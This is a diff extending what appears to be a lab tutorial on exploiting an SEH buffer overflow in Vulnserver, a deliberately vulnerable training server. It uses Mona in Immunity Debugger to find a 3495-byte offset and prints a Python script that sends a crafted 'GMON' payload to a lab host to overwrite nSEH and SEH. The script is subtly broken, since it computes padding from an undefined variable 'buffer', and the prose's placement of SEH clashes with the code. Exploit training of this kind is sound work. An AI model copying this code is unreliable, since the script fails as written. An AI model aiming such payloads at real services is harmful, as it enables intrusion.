@@ -83,3 +83,28 @@ s.close()
 We then restart the application in Immunity Debugger, and throw our exploit at Vulnserver. Again, the application crashes. This time, however, we know that the SEH chain can be overwritten by our supplied data. There is a really neat python framework known as [Mona](https://github.com/corelan/mona) that can be ported into Immunity. We will run a script that will find any instances of cyclic patterns (like the one we supplied above). The command to issue that in Immunity is: `!mona findmsp`. You will need to issue this command in the white text bar at the bottom of the debugger, near the Windows start button. Here is what mona finds (You can right click on the first image below and open it in a new tab if it is too hard to read. I added a second picture to zoom in on the actual offset value:
 <img src="{{ site.url }}{{ site.baseurl }}/images/cyclic.png" alt="">
 <img src="{{ site.url }}{{ site.baseurl }}/images/cyclic2.png" alt="">
+
+We can conclude that is takes 3495 bytes of data to reach nSEH. We can also use deductive reasoning to determine SEH is 4 bytes in front of nSEH. Let's update our Python script to validate with a sanity check:
+```console
+root@kali:~/Desktop# cat VALIDATE.py 
+#!/usr/bin/python
+import socket
+import sys
+import os
+
+#Vulnerable command
+command = "GMON /.:/"
+
+pwn = "A" * 3495
+pwn+= "B" * 4
+pwn+= "C" * 4
+pwn+= "D" * (5000-len(buffer))
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("172.16.55.134", 9999))
+
+s.send(command+pwn)
+s.recv(1024)
+s.close()
+```
+The above script sends 3495 bytes of data, to reach the location of nSEH. We are going to fill nSEH with 4 B's (42 hex) and SEH with 4 C's (43 hex). Remember, 5000 bytes is how much we concluded our application needs to crash. We fill the rest of our data with D's, and take 5000 minus the A's, B's, and C's.
